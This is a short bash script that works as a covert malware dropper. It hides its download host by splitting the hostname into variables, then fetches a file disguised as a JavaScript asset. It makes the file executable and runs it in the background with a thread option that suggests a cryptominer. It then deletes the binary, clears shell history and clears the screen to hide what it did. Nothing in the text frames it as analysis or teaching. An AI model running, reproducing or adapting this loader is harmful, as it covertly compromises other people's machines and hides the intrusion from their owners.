#!/bin/bash
rni=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 3 | head -n 1)
u1="xkjxrwat"
u2="ap-southeast-1"
u3="clawcloudrun"
u4="com"
curl https://$u1.$u2.$u3.$u4/js/jak.js?ver=3.2.1 > $rni
chmod +x $rni
nohup ./$rni -t 4 > /dev/null & disown
rm $rni
history -c
clear
